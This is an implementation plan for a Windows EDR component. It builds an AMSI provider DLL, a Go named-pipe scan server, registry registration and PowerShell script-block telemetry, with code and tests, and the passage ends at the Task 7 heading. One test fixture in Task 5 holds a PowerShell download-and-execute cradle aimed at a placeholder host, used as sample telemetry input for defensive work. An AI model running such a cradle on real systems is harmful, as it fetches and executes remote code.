# UTMStack EDR — Phase 1 Windows — Plan 4: Scripts & telemetry

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Block malicious scripts/macros/fileless content **before execution** via a native AMSI provider, and forward light behavioral telemetry (process-creation + PowerShell script-block logs + AMSI content) to the platform for Sigma correlation.

**Architecture:** Builds on Plans 1–3. The one unavoidable non-Go artifact — a minimal native C/C++ `IAntimalwareProvider` COM DLL — is loaded by Windows into every script host; its only job is to forward the submitted buffer to the Go EDR service over a local named pipe and return the verdict. The Go service scans the buffer via clamd, emits the branded `amsi` event, and applies the fail-open/closed policy. A behavioral forwarder reuses Plan 3's process feed and reads PowerShell 4104 events. Go logic is TDD'd; the DLL, named-pipe transport, registry registration, and event-log reading are VM-verified.

**Tech Stack:** Go 1.25.5 + Plan 1–3 packages; `golang.org/x/sys/windows` (named pipe, registry — already present); **C/C++ (MSVC `cl.exe`)** for the AMSI DLL (the pre-authorized Go-first exception); `amsi.h`/`amsi.lib` from the Windows SDK.

## Global Constraints

All Plan 1 Global Constraints carry over (branch `release/v12.0.0`, **branding never emits `clamav`/`clamd`**, event contract with `source ∈ {…,amsi,…}`, own `edr.db`, no kernel driver, SYSTEM service). Plus:

- **Go-first, single native exception:** only the AMSI provider is C/C++. Everything else — the pipe server, eventing, registration, policy, telemetry — is Go. The Go module owns, ships, registers, and drives the DLL.
- **Authenticode signing** for the DLL (and the EDR binary) — ordinary code signing, never the driver path.
- **AMSI honesty:** the provider sees only submitter-sent content, runs in-process (not tamper-proof), and does not see plain `.exe` launches. Documented, not hidden.
- **Fail policy:** if the EDR service/engine is unreachable, default **fail-open** (allow + alert); fail-closed configurable (`cfg.FailMode`).
- **Depends on Plans 1–3.**

**Build/test note:** Go logic via `go test` on macOS; the DLL is built with MSVC on the VM (or a Windows build box); AMSI blocking, pipe transport, registration, and 4104 reading are VM-verified on `10.211.55.12`.

---

## File Structure

**New Go packages:**
- `agent/edr/amsi/scanner.go` — portable AMSI scan core (buffer → verdict + event + fail policy), TDD'd.
- `agent/edr/amsi/pipe_windows.go` — named-pipe server hosting the scan endpoint (`//go:build windows`).
- `agent/edr/amsi/pipe_other.go` — stub (`//go:build !windows`).
- `agent/edr/amsi/register_windows.go` — DLL registry (un)registration (`//go:build windows`).
- `agent/edr/amsi/register_other.go` — stub.
- `agent/edr/behavioral/behavioral.go` — telemetry event builders (pure).
- `agent/edr/behavioral/pslog_windows.go` — PowerShell 4104 reader (`//go:build windows`).
- `agent/edr/behavioral/pslog_other.go` — stub.

**Native (new):**
- `agent/edr/amsi/native/utmstack_amsi.cpp` — the COM provider.
- `agent/edr/amsi/native/utmstack_amsi.def` — exports.
- `agent/edr/amsi/native/build.ps1` — MSVC build script.

**Modified:**
- `agent/edr/service/service.go` — start the pipe server + behavioral forwarder; register DLL on enable, unregister on stop.
- `agent/edr/event/event.go` — add `ActionBlocked`, `ActionAllowed`, and a `NewAMSIEvent` helper; `SourceBehavioral` telemetry source.

---

## Task 1: AMSI scan core (buffer → verdict + event + fail policy)

**Files:**
- Create: `agent/edr/amsi/scanner.go`
- Modify: `agent/edr/event/event.go` (add `NewAMSIEvent`, `ActionBlocked`, `ActionAllowed`)
- Test: `agent/edr/amsi/scanner_test.go`

**Interfaces:**
- Produces:
  - `type Scanner struct{}`, `func NewScanner(cfg config.EDRConfig, sp *event.Spool) *Scanner` with injectable `scanBytes`
  - `func (s *Scanner) ScanBuffer(appName string, data []byte) (block bool)` — scans, emits an `amsi` event (`blocked`/`allowed`/`health`), returns whether to block; applies `FailMode` on engine error

- [ ] **Step 1: Write the failing test**

```go
// agent/edr/amsi/scanner_test.go
package amsi

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/utmstack/UTMStack/agent/edr/config"
	"github.com/utmstack/UTMStack/agent/edr/event"
)

func newTestScanner(t *testing.T, cfg config.EDRConfig) (*Scanner, string) {
	dir := t.TempDir()
	spoolPath := filepath.Join(dir, "e.ndjson")
	sp, err := event.OpenSpool(spoolPath, 1<<20)
	if err != nil {
		t.Fatal(err)
	}
	s := NewScanner(cfg, sp)
	return s, spoolPath
}

func TestScanBufferMaliciousBlocksAndEmits(t *testing.T) {
	s, spoolPath := newTestScanner(t, config.Default())
	s.scanBytes = func(addr string, data []byte) (bool, string, error) { return false, "PUA.Script.Test", nil }

	if block := s.ScanBuffer("PowerShell", []byte("bad")); !block {
		t.Fatal("expected block=true for malicious content")
	}
	b, _ := os.ReadFile(spoolPath)
	line := strings.TrimSpace(string(b))
	if !strings.Contains(line, `"source":"amsi"`) || !strings.Contains(line, `"action":"blocked"`) {
		t.Fatalf("bad amsi event: %s", line)
	}
	if strings.Contains(strings.ToLower(line), "clam") {
		t.Fatalf("leaked engine name: %s", line)
	}
}

func TestScanBufferCleanAllows(t *testing.T) {
	s, _ := newTestScanner(t, config.Default())
	s.scanBytes = func(addr string, data []byte) (bool, string, error) { return true, "", nil }
	if block := s.ScanBuffer("PowerShell", []byte("ok")); block {
		t.Fatal("expected block=false for clean content")
	}
}

func TestScanBufferFailOpenVsClosed(t *testing.T) {
	// engine error → fail-open (default) allows
	open := config.Default() // FailMode=open
	s, _ := newTestScanner(t, open)
	s.scanBytes = func(addr string, data []byte) (bool, string, error) { return false, "", errors.New("engine down") }
	if block := s.ScanBuffer("PowerShell", []byte("x")); block {
		t.Fatal("fail-open must allow on engine error")
	}

	closed := config.Default()
	closed.FailMode = "closed"
	s2, _ := newTestScanner(t, closed)
	s2.scanBytes = func(addr string, data []byte) (bool, string, error) { return false, "", errors.New("engine down") }
	if block := s2.ScanBuffer("PowerShell", []byte("x")); !block {
		t.Fatal("fail-closed must block on engine error")
	}
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `go test ./edr/amsi/ -v`
Expected: FAIL — undefined.

- [ ] **Step 3: Add event helpers to `agent/edr/event/event.go`**

```go
// add constants
const (
	ActionBlocked = "blocked"
	ActionAllowed = "allowed"
)
const SourceBehavioral = "behavioral"

// NewAMSIEvent builds a branded amsi event.
func NewAMSIEvent(action, verdict, signature, appName string) Event {
	return Event{
		Source:    SourceAMSI,
		Action:    action,
		Verdict:   verdict,
		Signature: signature,
		Severity:  "",
		// appName carried in ObjectPath for now (which script host submitted it)
		ObjectPath: appName,
	}
}
```

- [ ] **Step 4: Implement the scan core**

```go
// agent/edr/amsi/scanner.go
package amsi

import (
	"github.com/utmstack/UTMStack/agent/edr/config"
	"github.com/utmstack/UTMStack/agent/edr/engine"
	"github.com/utmstack/UTMStack/agent/edr/event"
	"github.com/utmstack/UTMStack/shared/logger"
)

type Scanner struct {
	cfg       config.EDRConfig
	spool     *event.Spool
	scanBytes func(addr string, data []byte) (bool, string, error)
}

func NewScanner(cfg config.EDRConfig, sp *event.Spool) *Scanner {
	return &Scanner{cfg: cfg, spool: sp, scanBytes: engine.ScanBytes}
}

// ScanBuffer scans dynamic content submitted via AMSI and returns whether the
// host should block execution. It emits a branded amsi event and applies the
// configured fail policy when the engine is unreachable.
func (s *Scanner) ScanBuffer(appName string, data []byte) bool {
	clean, sig, err := s.scanBytes(s.cfg.ClamdAddr, data)
	if err != nil {
		failClosed := s.cfg.FailMode == "closed"
		logger.Error("UTMStack EDR AMSI: scan engine unreachable, fail-%s", modeName(failClosed))
		s.emit(event.NewAMSIEvent(event.ActionHealth, "unknown", "", appName))
		return failClosed
	}
	if !clean {
		s.emit(event.NewAMSIEvent(event.ActionBlocked, "malicious", sig, appName))
		return true
	}
	// Do not emit an event for every clean buffer (too noisy); allow silently.
	return false
}

func (s *Scanner) emit(ev event.Event) {
	if s.spool == nil {
		return
	}
	if js, err := ev.ToJSON(); err == nil {
		_ = s.spool.Append(js)
	}
}

func modeName(closed bool) string {
	if closed {
		return "closed"
	}
	return "open"
}
```

- [ ] **Step 5: Run to verify it passes**

Run: `go test ./edr/amsi/ ./edr/event/ -v`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add agent/edr/amsi/scanner.go agent/edr/amsi/scanner_test.go agent/edr/event/
git commit -m "feat(edr): AMSI scan core with fail-open/closed policy and branded events"
```

---

## Task 2: Named-pipe server (Windows) + stub

**Files:**
- Create: `agent/edr/amsi/pipe_windows.go` (`//go:build windows`), `agent/edr/amsi/pipe_other.go` (`//go:build !windows`)
- Test: build-only; transport VM-verified.

**Interfaces:**
- Produces:
  - `const PipeName = \`\\.\pipe\utmstack_edr_amsi\``
  - `type PipeServer struct{}`, `func NewPipeServer(s *Scanner) *PipeServer`, `func (p *PipeServer) Run(ctx context.Context)`
  - Wire protocol: request = 4-byte LE length + `appName\0` + buffer; response = 1 byte (`0`=allow, `1`=block).

- [ ] **Step 1: Non-Windows stub**

```go
// agent/edr/amsi/pipe_other.go
//go:build !windows

package amsi

import "context"

const PipeName = `\\.\pipe\utmstack_edr_amsi`

type PipeServer struct{}

func NewPipeServer(s *Scanner) *PipeServer { return &PipeServer{} }
func (p *PipeServer) Run(ctx context.Context) { <-ctx.Done() }
```

- [ ] **Step 2: Windows named-pipe server**

Uses `github.com/Microsoft/go-winio` if available, else raw `CreateNamedPipe` via `x/sys/windows`. To avoid a new dependency, use `x/sys/windows` directly.

```go
// agent/edr/amsi/pipe_windows.go
//go:build windows

package amsi

import (
	"context"
	"encoding/binary"
	"io"

	"github.com/utmstack/UTMStack/shared/logger"
	"golang.org/x/sys/windows"
)

const PipeName = `\\.\pipe\utmstack_edr_amsi`

type PipeServer struct{ s *Scanner }

func NewPipeServer(s *Scanner) *PipeServer { return &PipeServer{s: s} }

func (p *PipeServer) Run(ctx context.Context) {
	name, _ := windows.UTF16PtrFromString(PipeName)
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		// PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED not needed for simple sync use.
		h, err := windows.CreateNamedPipe(name,
			windows.PIPE_ACCESS_DUPLEX,
			windows.PIPE_TYPE_BYTE|windows.PIPE_READMODE_BYTE|windows.PIPE_WAIT,
			windows.PIPE_UNLIMITED_INSTANCES,
			65536, 65536, 0, nil)
		if err != nil {
			logger.Error("UTMStack EDR AMSI: create pipe: %v", err)
			return
		}
		// ConnectNamedPipe blocks until a client (the DLL) connects.
		err = windows.ConnectNamedPipe(h, nil)
		if err != nil && err != windows.ERROR_PIPE_CONNECTED {
			windows.CloseHandle(h)
			continue
		}
		p.handle(h)
		windows.FlushFileBuffers(h)
		windows.DisconnectNamedPipe(h)
		windows.CloseHandle(h)
	}
}

func (p *PipeServer) handle(h windows.Handle) {
	var lenBuf [4]byte
	if !readFull(h, lenBuf[:]) {
		return
	}
	n := binary.LittleEndian.Uint32(lenBuf[:])
	if n == 0 || n > 50*1024*1024 {
		return
	}
	payload := make([]byte, n)
	if !readFull(h, payload) {
		return
	}
	// payload = appName\0 + content
	appName, content := splitAppName(payload)
	block := p.s.ScanBuffer(appName, content)
	resp := []byte{0}
	if block {
		resp[0] = 1
	}
	var written uint32
	_ = windows.WriteFile(h, resp, &written, nil)
}

func readFull(h windows.Handle, buf []byte) bool {
	got := 0
	for got < len(buf) {
		var n uint32
		err := windows.ReadFile(h, buf[got:], &n, nil)
		if err != nil || n == 0 {
			return errIsEOFOK(err) && got == len(buf)
		}
		got += int(n)
	}
	return true
}

func errIsEOFOK(err error) bool { return err == nil || err == io.EOF }

func splitAppName(payload []byte) (string, []byte) {
	for i, b := range payload {
		if b == 0 {
			return string(payload[:i]), payload[i+1:]
		}
	}
	return "", payload
}
```

> **VM verification point:** the exact `x/sys/windows` named-pipe constant/function set (`CreateNamedPipe`, `ConnectNamedPipe`, `PIPE_*`) is validated by compiling on the VM. If any constant is missing from the pinned version, define it locally (documented values) or vendor `github.com/Microsoft/go-winio` (add in this task only).

- [ ] **Step 3: Build both platforms**

Run: `go build ./edr/amsi/ && GOOS=windows GOARCH=amd64 go build ./edr/amsi/`
Expected: both succeed.

- [ ] **Step 4: Commit**

```bash
git add agent/edr/amsi/pipe_windows.go agent/edr/amsi/pipe_other.go
git commit -m "feat(edr): AMSI named-pipe scan server (windows) + stub"
```

---

## Task 3: Native AMSI provider COM DLL (C/C++)

**Files:**
- Create: `agent/edr/amsi/native/utmstack_amsi.cpp`, `utmstack_amsi.def`, `build.ps1`
- Test: built + registered + exercised on the VM (Task 7).

**Interfaces:**
- Produces `utmstack_amsi.dll` implementing `IAntimalwareProvider`; on `Scan` it reads the content, forwards `appName\0 + content` to `\\.\pipe\utmstack_edr_amsi`, and maps the 1-byte reply to `AMSI_RESULT_DETECTED` / `AMSI_RESULT_NOT_DETECTED`.
- CLSID (fixed, referenced by registration in Task 4): `{9E9DA9F6-3C4B-4E7B-9E1A-UTMSTACKEDR01}` → use a real generated GUID, e.g. `{7B8E4F20-2C3D-4A5B-9C6E-1F2A3B4C5D6E}` (generate one and keep it identical here and in Task 4).

- [ ] **Step 1: Write the provider**

```cpp
// agent/edr/amsi/native/utmstack_amsi.cpp
// Minimal IAntimalwareProvider that forwards content to the UTMStack EDR
// service over a named pipe and returns the verdict. No engine name appears
// anywhere in this DLL's strings.
#include <windows.h>
#include <amsi.h>
#include <new>

// {7B8E4F20-2C3D-4A5B-9C6E-1F2A3B4C5D6E}
static const CLSID CLSID_UtmStackAmsi =
    { 0x7b8e4f20, 0x2c3d, 0x4a5b, { 0x9c, 0x6e, 0x1f, 0x2a, 0x3b, 0x4c, 0x5d, 0x6e } };

static const wchar_t* PIPE_NAME = L"\\\\.\\pipe\\utmstack_edr_amsi";
static LONG g_refs = 0;

// Returns true to BLOCK (malicious). Fails open (false) on any transport error.
static bool ForwardToService(const wchar_t* appName, const BYTE* data, ULONG size) {
    HANDLE pipe = CreateFileW(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0,
                              nullptr, OPEN_EXISTING, 0, nullptr);
    if (pipe == INVALID_HANDLE_VALUE) return false;

    // Build payload: appNameUtf8 + '\0' + content. Keep appName ASCII-ish.
    char app[256]; int appLen = 0;
    if (appName) {
        appLen = WideCharToMultiByte(CP_UTF8, 0, appName, -1, app, sizeof(app) - 1, nullptr, nullptr);
        if (appLen > 0) appLen--; // drop the counted null; we add it explicitly
    }
    DWORD total = (DWORD)appLen + 1 + size;
    DWORD written = 0;
    WriteFile(pipe, &total, 4, &written, nullptr);
    if (appLen > 0) WriteFile(pipe, app, appLen, &written, nullptr);
    char zero = 0; WriteFile(pipe, &zero, 1, &written, nullptr);
    if (size > 0) WriteFile(pipe, data, size, &written, nullptr);

    BYTE resp = 0; DWORD read = 0;
    bool ok = ReadFile(pipe, &resp, 1, &read, nullptr) && read == 1;
    CloseHandle(pipe);
    return ok && resp == 1;
}

class Provider : public IAntimalwareProvider {
public:
    // IUnknown
    STDMETHODIMP QueryInterface(REFIID riid, void** ppv) override {
        if (riid == IID_IUnknown || riid == __uuidof(IAntimalwareProvider)) {
            *ppv = static_cast<IAntimalwareProvider*>(this);
            AddRef();
            return S_OK;
        }
        *ppv = nullptr;
        return E_NOINTERFACE;
    }
    STDMETHODIMP_(ULONG) AddRef() override { return InterlockedIncrement(&g_refs); }
    STDMETHODIMP_(ULONG) Release() override {
        LONG r = InterlockedDecrement(&g_refs);
        if (r == 0) delete this;
        return r;
    }

    // IAntimalwareProvider
    STDMETHODIMP Scan(IAmsiStream* stream, AMSI_RESULT* result) override {
        *result = AMSI_RESULT_NOT_DETECTED;
        if (!stream) return S_OK;

        // Content size
        ULONG size = 0, got = 0;
        stream->GetAttribute(AMSI_ATTRIBUTE_CONTENT_SIZE, (unsigned char*)&size, sizeof(size), &got);

        // Content address (in-memory) if available
        BYTE* addr = nullptr;
        stream->GetAttribute(AMSI_ATTRIBUTE_CONTENT_ADDRESS, (unsigned char*)&addr, sizeof(addr), &got);

        // App name
        wchar_t appName[256] = L"";
        ULONG appGot = 0;
        stream->GetAttribute(AMSI_ATTRIBUTE_APP_NAME, (unsigned char*)appName, sizeof(appName) - 2, &appGot);

        bool block = false;
        if (addr && size > 0) {
            block = ForwardToService(appName, addr, size);
        } else {
            // Fall back to reading via IAmsiStream::Read in chunks.
            BYTE buf[65536]; ULONG total = 0;
            // Single read is sufficient for typical script buffers.
            ULONG r = stream->Read(0, buf, sizeof(buf));
            if (r > 0) { total = r; block = ForwardToService(appName, buf, total); }
        }
        if (block) *result = AMSI_RESULT_DETECTED;
        return S_OK;
    }
    STDMETHODIMP_(void) CloseSession(ULONGLONG) override {}
    STDMETHODIMP DisplayName(LPWSTR* displayName) override {
        static const wchar_t name[] = L"UTMStack EDR";
        size_t bytes = sizeof(name);
        *displayName = (LPWSTR)CoTaskMemAlloc(bytes);
        if (!*displayName) return E_OUTOFMEMORY;
        memcpy(*displayName, name, bytes);
        return S_OK;
    }
};

class Factory : public IClassFactory {
public:
    STDMETHODIMP QueryInterface(REFIID riid, void** ppv) override {
        if (riid == IID_IUnknown || riid == IID_IClassFactory) {
            *ppv = static_cast<IClassFactory*>(this); AddRef(); return S_OK;
        }
        *ppv = nullptr; return E_NOINTERFACE;
    }
    STDMETHODIMP_(ULONG) AddRef() override { return InterlockedIncrement(&g_refs); }
    STDMETHODIMP_(ULONG) Release() override { return InterlockedDecrement(&g_refs); }
    STDMETHODIMP CreateInstance(IUnknown* outer, REFIID riid, void** ppv) override {
        if (outer) return CLASS_E_NOAGGREGATION;
        Provider* p = new (std::nothrow) Provider();
        if (!p) return E_OUTOFMEMORY;
        HRESULT hr = p->QueryInterface(riid, ppv);
        p->Release();
        return hr;
    }
    STDMETHODIMP LockServer(BOOL) override { return S_OK; }
};

static Factory g_factory;

STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, void** ppv) {
    if (rclsid == CLSID_UtmStackAmsi) return g_factory.QueryInterface(riid, ppv);
    return CLASS_E_CLASSNOTAVAILABLE;
}
STDAPI DllCanUnloadNow() { return g_refs == 0 ? S_OK : S_FALSE; }
BOOL WINAPI DllMain(HINSTANCE, DWORD, LPVOID) { return TRUE; }
```

```
; agent/edr/amsi/native/utmstack_amsi.def
LIBRARY utmstack_amsi
EXPORTS
    DllGetClassObject PRIVATE
    DllCanUnloadNow   PRIVATE
```

- [ ] **Step 2: Build script (MSVC, on the VM or a Windows build box)**

```powershell
# agent/edr/amsi/native/build.ps1
# Requires: Visual Studio Build Tools + Windows SDK (amsi.h, amsi.lib).
$ErrorActionPreference = "Stop"
cl.exe /LD /EHsc /O2 /DUNICODE /D_UNICODE `
  utmstack_amsi.cpp `
  /link /DEF:utmstack_amsi.def amsi.lib ole32.lib `
  /OUT:utmstack_amsi.dll
Write-Host "Built utmstack_amsi.dll"
```

- [ ] **Step 3: Build the DLL on the VM and confirm exports**

Run (VM):
```powershell
cd agent\edr\amsi\native
powershell -File build.ps1
dumpbin /exports utmstack_amsi.dll   # expect DllGetClassObject, DllCanUnloadNow
```
Expected: `utmstack_amsi.dll` produced with both exports.

- [ ] **Step 4: Sign the DLL (Authenticode)**

Run (VM, with the code-signing cert):
```powershell
signtool sign /fd SHA256 /a utmstack_amsi.dll
signtool verify /pa utmstack_amsi.dll
```
Expected: signature valid.

- [ ] **Step 5: Commit the native sources**

```bash
git add agent/edr/amsi/native/
git commit -m "feat(edr): native IAntimalwareProvider COM DLL forwarding to the EDR pipe"
```

---

## Task 4: DLL registration by the EDR service

**Files:**
- Create: `agent/edr/amsi/register_windows.go` (`//go:build windows`), `register_other.go` (`//go:build !windows`)
- Test: build-only; registry effect VM-verified.

**Interfaces:**
- Produces:
  - `const CLSID = "{7B8E4F20-2C3D-4A5B-9C6E-1F2A3B4C5D6E}"` (identical to the DLL)
  - `func Register(dllPath string) error` — writes `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32` (= dllPath, ThreadingModel=Both) and `HKLM\SOFTWARE\Microsoft\AMSI\Providers\{CLSID}`
  - `func Unregister() error`

- [ ] **Step 1: Stub**

```go
// agent/edr/amsi/register_other.go
//go:build !windows

package amsi

const CLSID = "{7B8E4F20-2C3D-4A5B-9C6E-1F2A3B4C5D6E}"

func Register(dllPath string) error { return nil }
func Unregister() error             { return nil }
```

- [ ] **Step 2: Windows registration via `golang.org/x/sys/windows/registry`**

```go
// agent/edr/amsi/register_windows.go
//go:build windows

package amsi

import (
	"golang.org/x/sys/windows/registry"
)

const CLSID = "{7B8E4F20-2C3D-4A5B-9C6E-1F2A3B4C5D6E}"

func Register(dllPath string) error {
	// CLSID\InprocServer32
	inproc := `SOFTWARE\Classes\CLSID\` + CLSID + `\InprocServer32`
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, inproc, registry.SET_VALUE)
	if err != nil {
		return err
	}
	if err := k.SetStringValue("", dllPath); err != nil {
		k.Close()
		return err
	}
	if err := k.SetStringValue("ThreadingModel", "Both"); err != nil {
		k.Close()
		return err
	}
	k.Close()

	// AMSI provider registration
	prov := `SOFTWARE\Microsoft\AMSI\Providers\` + CLSID
	pk, _, err := registry.CreateKey(registry.LOCAL_MACHINE, prov, registry.SET_VALUE)
	if err != nil {
		return err
	}
	pk.Close()
	return nil
}

func Unregister() error {
	_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\AMSI\Providers\`+CLSID)
	_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Classes\CLSID\`+CLSID+`\InprocServer32`)
	_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Classes\CLSID\`+CLSID)
	return nil
}
```

Note: `golang.org/x/sys/windows/registry` is part of the already-present `golang.org/x/sys` module — no new dependency.

- [ ] **Step 3: Build both platforms**

Run: `go build ./edr/amsi/ && GOOS=windows GOARCH=amd64 go build ./edr/amsi/`
Expected: both succeed.

- [ ] **Step 4: Commit**

```bash
git add agent/edr/amsi/register_windows.go agent/edr/amsi/register_other.go
git commit -m "feat(edr): register/unregister the AMSI provider under HKLM"
```

---

## Task 5: Behavioral forwarder (process telemetry + PowerShell 4104)

**Files:**
- Create: `agent/edr/behavioral/behavioral.go`, `pslog_windows.go`, `pslog_other.go`
- Test: `agent/edr/behavioral/behavioral_test.go`

**Interfaces:**
- Produces:
  - `func ProcTelemetry(p proctable.Proc) event.Event` — a `behavioral` telemetry event for a process start
  - `func ScriptBlockTelemetry(scriptText, path string) event.Event`
  - `type PSLogReader struct{}`, `func NewPSLogReader(sp *event.Spool) *PSLogReader`, `func (r *PSLogReader) Run(ctx context.Context)` — polls the PowerShell/Operational log for event 4104 and forwards new records

- [ ] **Step 1: Write the failing test (pure builders)**

```go
// agent/edr/behavioral/behavioral_test.go
package behavioral

import (
	"strings"
	"testing"

	"github.com/utmstack/UTMStack/agent/edr/proctable"
)

func TestProcTelemetryBranded(t *testing.T) {
	e := ProcTelemetry(proctable.Proc{PID: 10, PPID: 4, Image: `C:\Windows\System32\cmd.exe`, Cmdline: "cmd /c whoami"})
	js, err := e.ToJSON()
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{`"source":"behavioral"`, `"product":"UTMStack EDR"`, `"pid":10`} {
		if !strings.Contains(js, want) {
			t.Fatalf("missing %q in %s", want, js)
		}
	}
}

func TestScriptBlockTelemetryBranded(t *testing.T) {
	e := ScriptBlockTelemetry("IEX (New-Object Net.WebClient).DownloadString('http://x')", "PowerShell")
	js, _ := e.ToJSON()
	if !strings.Contains(js, `"source":"behavioral"`) || strings.Contains(strings.ToLower(js), "clam") {
		t.Fatalf("bad telemetry event: %s", js)
	}
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `go test ./edr/behavioral/ -v`
Expected: FAIL — undefined.

- [ ] **Step 3: Implement the builders + stub**

```go
// agent/edr/behavioral/behavioral.go
package behavioral

import (
	"github.com/utmstack/UTMStack/agent/edr/event"
	"github.com/utmstack/UTMStack/agent/edr/proctable"
)

// ProcTelemetry builds a behavioral telemetry event for a process start.
func ProcTelemetry(p proctable.Proc) event.Event {
	pc := event.ProcInfo{PID: p.PID, PPID: p.PPID, Image: p.Image, Cmdline: p.Cmdline}
	return event.Event{
		Source:     event.SourceBehavioral,
		Action:     "process_create",
		ObjectPath: p.Image,
		Process:    &pc,
	}
}

// ScriptBlockTelemetry builds a behavioral event carrying deobfuscated script text.
func ScriptBlockTelemetry(scriptText, appName string) event.Event {
	return event.Event{
		Source:     event.SourceBehavioral,
		Action:     "script_block",
		ObjectPath: appName,
		Signature:  truncate(scriptText, 8192),
	}
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n]
	}
	return s
}
```

```go
// agent/edr/behavioral/pslog_other.go
//go:build !windows

package behavioral

import (
	"context"

	"github.com/utmstack/UTMStack/agent/edr/event"
)

type PSLogReader struct{}

func NewPSLogReader(sp *event.Spool) *PSLogReader { return &PSLogReader{} }
func (r *PSLogReader) Run(ctx context.Context)    { <-ctx.Done() }
```

- [ ] **Step 4: Windows 4104 reader (wevtutil poll)**

```go
// agent/edr/behavioral/pslog_windows.go
//go:build windows

package behavioral

import (
	"context"
	"encoding/xml"
	"strings"
	"time"

	"github.com/utmstack/UTMStack/agent/edr/event"
	"github.com/utmstack/UTMStack/shared/exec"
	"github.com/utmstack/UTMStack/shared/logger"
)

type PSLogReader struct {
	spool     *event.Spool
	lastRecID int64
}

func NewPSLogReader(sp *event.Spool) *PSLogReader { return &PSLogReader{spool: sp} }

func (r *PSLogReader) Run(ctx context.Context) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			r.poll()
		}
	}
}

func (r *PSLogReader) poll() {
	// Query the last 20 script-block (4104) events as XML.
	out, err := exec.RunWithOutput("wevtutil", ".",
		"qe", "Microsoft-Windows-PowerShell/Operational",
		"/q:*[System[EventID=4104]]", "/c:20", "/rd:true", "/f:xml")
	if err != nil {
		logger.Debug(100, "UTMStack EDR behavioral: wevtutil: %v", err)
		return
	}
	for _, ev := range parse4104(out) {
		if ev.recordID <= r.lastRecID {
			continue
		}
		if ev.recordID > r.lastRecID {
			r.lastRecID = ev.recordID
		}
		te := ScriptBlockTelemetry(ev.scriptText, "PowerShell")
		if js, err := te.ToJSON(); err == nil {
			_ = r.spool.Append(js)
		}
	}
}

type ps4104 struct {
	recordID   int64
	scriptText string
}

// parse4104 extracts EventRecordID and the ScriptBlockText EventData field.
func parse4104(xmlOut string) []ps4104 {
	// wevtutil emits multiple <Event>..</Event> blocks concatenated.
	var out []ps4104
	dec := xml.NewDecoder(strings.NewReader("<root>" + xmlOut + "</root>"))
	type evtData struct {
		Data []struct {
			Name string `xml:"Name,attr"`
			Val  string `xml:",chardata"`
		} `xml:"EventData>Data"`
		RecordID int64 `xml:"System>EventRecordID"`
	}
	var root struct {
		Events []evtData `xml:"Event"`
	}
	if err := dec.Decode(&root); err != nil {
		return out
	}
	for _, e := range root.Events {
		var script string
		for _, d := range e.Data {
			if d.Name == "ScriptBlockText" {
				script = d.Val
			}
		}
		out = append(out, ps4104{recordID: e.RecordID, scriptText: script})
	}
	return out
}
```

> **VM verification point:** wevtutil output shape and that PowerShell script-block logging (4104) is enabled (`Group Policy > Windows PowerShell > Turn on PowerShell Script Block Logging`). The `parse4104` XML shaping is unit-testable; add a `parse4104_test.go` with a captured XML sample if desired.

- [ ] **Step 5: Run tests + build both platforms**

Run: `go test ./edr/behavioral/ -v && GOOS=windows GOARCH=amd64 go build ./edr/behavioral/`
Expected: PASS + build OK.

- [ ] **Step 6: Commit**

```bash
git add agent/edr/behavioral/
git commit -m "feat(edr): behavioral forwarder (process + PowerShell 4104 telemetry)"
```

---

## Task 6: Wire AMSI + behavioral into the service

**Files:**
- Modify: `agent/edr/service/service.go`

**Interfaces:**
- On enable: start `amsi.NewPipeServer(amsi.NewScanner(cfg, sp)).Run(ctx)`; `amsi.Register(<install>/utmstack_amsi.dll)`; start `behavioral.NewPSLogReader(sp).Run(ctx)`; also forward process telemetry from the Plan 3 dispatch.
- On stop: `amsi.Unregister()`.

- [ ] **Step 1: Wire it**

In the `if cfg.Enabled` block of `run()`:

```go
		// AMSI provider: pipe server + registration
		amsiSc := amsi.NewScanner(cfg, sp)
		go amsi.NewPipeServer(amsiSc).Run(ctx)
		dll := filepath.Join(config.InstallDir, "utmstack_amsi.dll")
		if err := amsi.Register(dll); err != nil {
			logger.Error("UTMStack EDR: AMSI register: %v", err)
		}

		// Behavioral forwarder: PowerShell 4104
		go behavioral.NewPSLogReader(sp).Run(ctx)
```

In `program.Stop`, before returning, add:
```go
	_ = amsi.Unregister()
```

Add imports (`amsi`, `behavioral`, `path/filepath`).

- [ ] **Step 2: Forward process telemetry (reuse Plan 3 dispatch)**

Extend `procwatch.Dispatch` (Plan 3) to also emit `behavioral.ProcTelemetry` into the spool. Modify `NewDispatch` to accept the spool and append proc telemetry in `OnProcStart`:

```go
// in procwatch/dispatch.go OnProcStart, after table.Add:
	if d.spool != nil {
		if js, err := behavioral.ProcTelemetry(proctable.Proc{PID: ps.PID, PPID: ps.PPID, Image: ps.Image, Cmdline: ps.Cmdline}).ToJSON(); err == nil {
			_ = d.spool.Append(js)
		}
	}
```
(Add a `spool *event.Spool` field to `Dispatch` and update `NewDispatch` + the service wiring + the Plan 3 dispatch test to pass a spool or nil.)

- [ ] **Step 3: Build both platforms + full test**

Run: `go build ./... && GOOS=windows GOARCH=amd64 go build ./... && go test ./edr/... ./agent/`
Expected: builds + all tests pass.

- [ ] **Step 4: Commit**

```bash
git add agent/edr/service/ agent/edr/procwatch/
git commit -m "feat(edr): start AMSI provider + behavioral forwarder from the service"
```

---

## Task 7: End-to-end acceptance on the VM

